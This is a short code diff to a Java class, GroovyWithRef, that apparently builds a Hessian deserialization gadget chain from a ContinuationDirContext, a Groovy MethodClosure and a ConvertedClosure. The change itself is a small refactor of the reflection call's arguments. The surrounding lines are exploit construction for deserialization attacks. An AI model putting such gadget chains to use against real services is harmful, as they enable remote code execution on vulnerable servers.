@@ -40,7 +40,7 @@ public class GroovyWithRef extends HessianPayload {
         Object ctx = ReflectionHelper.newInstance(
                 "javax.naming.spi.ContinuationDirContext",
                 new Class[]{CannotProceedException.class, Hashtable.class},
-                new Object[]{cpe, new Hashtable<>()});
+                cpe, new Hashtable<>());
 
         MethodClosure closure = new MethodClosure(ctx, "listBindings");
         ConvertedClosure convertedClosure = new ConvertedClosure(closure, "compareTo");
